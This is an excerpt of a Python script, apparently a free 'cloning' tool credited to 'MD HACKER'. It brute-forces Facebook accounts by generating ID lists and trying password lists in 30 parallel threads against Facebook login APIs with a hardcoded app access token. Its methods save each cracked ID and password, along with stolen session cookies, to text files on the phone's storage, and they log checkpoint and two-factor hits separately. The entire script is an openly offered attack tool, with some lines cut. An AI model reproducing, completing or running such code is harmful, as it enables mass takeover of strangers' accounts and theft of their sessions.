...
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m] Author   : MD HACKER
 [\033[1;32m*\033[1;37m] Facebook : MD HACKER
 [\033[1;32m*\033[1;37m] Developer : USMAN SARKAR ( T O X I C )
 [\033[1;32m*\033[1;37m] Tool     : FREE
 [\033[1;32m*\033[1;37m] Version  : 0.0.1
 [\033[1;32m*\033[1;37m] ________WHATSAPP BANNER + APPLICATION MAKER -//🚫
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/MD-OK.txt\033[1;37m
\033[1;37m--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as MD:	
			clear()
			tl = str(len(user))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [MD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [MD-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MD-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [MD-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/MD-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/MD-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/MD-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MD-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
#method4
def MD4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MD-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MD-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/MD-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/MD-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [MD-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MD-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
